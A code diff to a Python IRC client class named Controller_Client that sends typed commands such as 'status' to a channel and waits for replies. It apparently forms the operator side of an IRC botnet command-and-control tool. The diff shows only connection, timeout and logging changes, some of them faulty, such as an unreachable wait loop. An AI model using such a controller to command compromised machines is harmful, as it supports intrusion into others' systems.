@@ -26,12 +26,6 @@ class Controller_Client:
             # prompt user to enter a command and execute it
             command = self.__prompt_command()
             self.__send_command(command)
-            
-            timeout = 5 # timeout (in seconds)
-            timeout_start = time.time()
-            self.log("Waiting for responses...")
-            while time.time() < timeout_start + timeout:
-                pass
 
         self.irc_socket.close()
     
@@ -42,6 +36,11 @@ class Controller_Client:
 
     #TODO define functionality for each command 
     def __send_command(self, command):
+        self.send_to_channel(command)
+        response = self.get_text()
+
+        if ("PRIVMSG" not in response) or (self.channel not in response):
+            return False #TODO
         if command == "status":
             self.send_to_channel("status")
             return True
@@ -60,6 +59,12 @@ class Controller_Client:
         else:
             self.send_to_channel(command)
             return False
+
+        timeout = 5 # timeout (in seconds)
+        timeout_start = time.time()
+        self.log("Waiting for responses...")
+        while time.time() < timeout_start + timeout:
+            pass
             
     # Closes connection and terminates controller
     def __terminate(self):
@@ -69,7 +74,7 @@ class Controller_Client:
 
     # Code adapted from: https://pythonspot.com/en/building-an-irc-bot/
     def get_text(self):
-        print("here")
+        print("right before recv")
         text = self.recv_msg() #receive the text
         if text.find('PING') != -1:
             self.send_msg('PONG ' + text.split()[1] + 'rn')
@@ -108,7 +113,7 @@ class Controller_Client:
         self.irc_socket.send(message.encode())
 
     def recv_msg(self):
-        self.irc_socket.settimeout(5.0)
+        self.irc_socket.settimeout(1.0)
         try:
             data = self.irc_socket.recv(2040).decode()  #receive the text
         except socket.timeout:
